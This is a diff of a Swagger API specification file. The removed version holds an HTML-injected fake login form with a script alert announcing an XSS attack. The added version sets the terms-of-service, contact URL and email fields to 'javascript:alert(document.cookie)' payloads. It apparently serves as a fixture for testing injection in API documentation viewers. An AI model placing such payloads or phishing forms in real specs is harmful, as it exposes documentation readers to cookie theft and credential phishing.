@@ -1,35 +1,12 @@
-swagger: '2.0'
-info:
-  version: 1.0.0
-  title: Fake Login Page
-  description: '<div class="login-form">
-    <div class="heading">
-        <h1>HTML Injection : geo poond group</h1>
-    </div>
-    <div class="form-container">
-        <form action="https://example.com/login" method="post" class="form-signin">
-            <div class="form-group">
-                <label for="username">Username</label>
-                <input type="text" name="username" size="20">
-            </div>
-            <div class="form-group">
-                <label for="password">Password</label>
-                <input type="password" name="password" size="20">
-            </div>
-            <div class="form-group">
-                <button type="submit" class="btn btn-default">Login</button>
-            </div>
-        </form>
-    </div>
-    <script>
-      alert("XSS Attack: You have been hacked!");
-    </script>
-</div>'
-paths:
-  /:
-    post:
-      responses:
-        '200':
-          description: Login successful
+swagger: "2.0",
+info: 
+  title: "Swagger Sample App",
+  description: "Please to click Terms of service"
+  termsOfService: "javascript:alert(document.cookie)"
+  contact: 
+    name: "API Support",
+    url: "javascript:alert(document.cookie)",
+    email: "javascript:alert(document.cookie)"
+  version: "1.0.1"
 
 
